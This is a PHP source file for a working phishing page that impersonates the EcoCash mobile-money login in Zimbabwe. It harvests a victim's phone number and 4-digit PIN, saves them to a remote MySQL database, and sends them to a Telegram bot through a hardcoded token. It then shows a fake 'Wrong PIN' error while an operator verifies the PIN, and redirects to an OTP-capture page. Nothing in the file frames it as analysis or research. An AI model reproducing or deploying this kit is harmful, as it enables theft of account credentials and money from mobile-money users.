<?php
session_start();

// ========== CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

$dbHost   = "78.111.67.22";        // ← quotes added
$dbPort   = getenv('DB_PORT') ?: 3306;
$dbName   = "loan";               // ← quotes added
$dbUser   = "root";               // ← quotes added
$dbPass   = "";                   // ← empty string, syntax fixed

// ==================================

$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
$error = '';

$flashMessage = '';
if (isset($_SESSION['flash_error'])) {
    $flashMessage = $_SESSION['flash_error'];
    unset($_SESSION['flash_error']);
}

if (empty($phone)) {
    header("Location: index.php");
    exit;
}

/**
 * Create a PDO connection (singleton pattern for reuse)
 * @return PDO|null
 */
function getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass) {
    static $pdo = null;
    if ($pdo === null) {
        // Check if PDO MySQL driver is available
        if (!in_array('mysql', PDO::getAvailableDrivers())) {
            error_log("PDO MySQL driver not found");
            return null;
        }
        try {
            $dsn = "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4";
            $pdo = new PDO($dsn, $dbUser, $dbPass, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_TIMEOUT => 5
            ]);
        } catch (PDOException $e) {
            error_log("Database connection failed: " . $e->getMessage());
            return null;
        }
    }
    return $pdo;
}

// Function to send Telegram message
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// AJAX endpoint: check status
if (isset($_GET['check_status']) && $_GET['check_status'] == 1) {
    header('Content-Type: application/json');
    $checkPhone = $_GET['phone'] ?? '';
    $checkPin   = $_GET['pin'] ?? '';
    if (empty($checkPhone) || empty($checkPin)) {
        echo json_encode(['verified' => false]);
        exit;
    }
    $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
    if (!$pdo) {
        echo json_encode(['verified' => false]);
        exit;
    }
    try {
        $stmt = $pdo->prepare("SELECT status FROM ecocash_auth WHERE phone = :phone AND pin = :pin LIMIT 1");
        $stmt->execute([':phone' => $checkPhone, ':pin' => $checkPin]);
        $record = $stmt->fetch();
        $verified = ($record && (int)$record['status'] === 1);
        echo json_encode(['verified' => $verified]);
    } catch (PDOException $e) {
        error_log("AJAX check_status error: " . $e->getMessage());
        echo json_encode(['verified' => false]);
    }
    exit;
}

// Process PIN submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pinArray = isset($_POST['pin']) ? $_POST['pin'] : [];
    $pin = implode('', $pinArray);
    $pin = preg_replace('/[^0-9]/', '', $pin);
    
    if (strlen($pin) === 4) {
        $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if (!$pdo) {
            $error = "System error: database driver missing. Please contact administrator.";
        } else {
            try {
                $insertStmt = $pdo->prepare("INSERT IGNORE INTO ecocash_auth (phone, pin, status) VALUES (:phone, :pin, 0)");
                $insertStmt->execute([':phone' => $phone, ':pin' => $pin]);
                
                // Send Telegram notification
                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
                $time = date('Y-m-d H:i:s');
                $msg = "🔐 *PIN Attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}\n⏰ Verify: https://hookupint.site/verify.php";
                sendTelegramMessage($botToken, $chatId, $msg);
                
                // Store the submitted PIN for polling
                $_SESSION['pending_pin'] = $pin;
                $error = "Wrong PIN";
            } catch (PDOException $e) {
                error_log("PIN insert error: " . $e->getMessage());
                $error = "System error. Try again later.";
            }
        }
    } else {
        $error = "PIN must be 4 digits.";
    }
}

// Get any pending PIN from session (for polling)
$pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>EcoCash | Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; }
body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #0a5fa7; }
.top {
    background: #ffffff;
    padding: 8vh 5vw 12vh;
    border-bottom-left-radius: 100% 80px;
    border-bottom-right-radius: 100% 80px;
    text-align: center;
}
.logo { font-size: 48px; font-weight: bold; margin-bottom: 20px; }
.logo span:first-child { color: #1d4ed8; }
.logo span:last-child { color: #dc2626; }
.login-title { font-size: 24px; color: #6b7280; margin-bottom: 30px; }
.phone-box {
    border: 2px solid #1d4ed8;
    border-radius: 12px;
    padding: 14px;
    display: flex;
    align-items: center;
    gap: 10px;
    max-width: 360px;
    margin: 0 auto 30px;
}
.flag { width: 26px; height: 18px; }
.code { font-size: 18px; color: #374151; }
.pin-label { color: #6b7280; margin-bottom: 15px; font-size: 16px; }
.pin {
    display: flex;
    justify-content: center;
    gap: 12px;
    margin-bottom: 20px;
}
.pin input {
    width: 55px;
    height: 55px;
    border: 2px solid #1d4ed8;
    border-radius: 10px;
    text-align: center;
    font-size: 22px;
    outline: none;
}
.pin input:focus { border-color: #2563eb; }
.forgot { color: #6b7280; font-size: 16px; text-decoration: none; }
.error-message, .flash-message {
    padding: 10px;
    border-radius: 8px;
    margin: 10px auto;
    max-width: 300px;
    font-size: 14px;
    text-align: center;
}
.error-message {
    color: #dc2626;
    background: #fee2e2;
}
.flash-message {
    color: #dc2626;
    background: #fee2e2;
}
.bottom {
    padding: 8vh 5vw 5vh;
    text-align: center;
    color: #ffffff;
}
.actions {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin-bottom: 30px;
}
.action-btn {
    background: #ffffff;
    color: #111827;
    width: 160px;
    padding: 18px 10px;
    border-radius: 14px;
    font-size: 16px;
    border: none;
    cursor: pointer;
}
.version { font-size: 14px; opacity: 0.9; }
.terms { font-size: 13px; opacity: 0.9; }
</style>
</head>
<body>

<div class="top">
    <div class="logo">
        <span>Eco</span><span>Cash</span>
    </div>
    <div class="login-title">Login</div>
    <div class="phone-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" class="flag">
        <div class="code">+263 <?= htmlspecialchars($phone) ?></div>
    </div>
    <div class="pin-label">Enter your PIN</div>

    <?php if ($flashMessage): ?>
        <div class="flash-message"><?= htmlspecialchars($flashMessage) ?></div>
    <?php endif; ?>

    <?php if ($error): ?>
        <div class="error-message"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="POST" id="pinForm">
        <div class="pin">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" autofocus>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off">
        </div>
    </form>
    <a href="#" class="forgot">Forgot PIN?</a>
</div>

<div class="bottom">
    <p>To register an EcoCash wallet or get assistance,<br>click below</p>
    <div class="actions">
        <button class="action-btn">👤 Register</button>
        <button class="action-btn">ℹ️ Help & Support</button>
    </div>
    <div class="version">v2.1.3P</div>
    <div class="terms">By signing in you agree to the Terms and Conditions</div>
</div>

<script>
const inputs = document.querySelectorAll('.pin input');
const phone = <?= json_encode($phone) ?>;
let pendingPin = <?= json_encode($pendingPin) ?>;

function allFilled() {
    let filled = true;
    inputs.forEach(i => {
        if (i.value.length === 0) filled = false;
    });
    if (filled) {
        document.getElementById('pinForm').submit();
    }
}

inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
        allFilled();
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

if (pendingPin && pendingPin.length === 4) {
    let pollingInterval = setInterval(async () => {
        try {
            const response = await fetch(`?check_status=1&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pendingPin)}`);
            const data = await response.json();
            if (data.verified === true) {
                clearInterval(pollingInterval);
                window.location.href = "otp.php";
            }
        } catch (err) {
            console.error("Polling error:", err);
        }
    }, 2000);
}
</script>

</body>
</html>
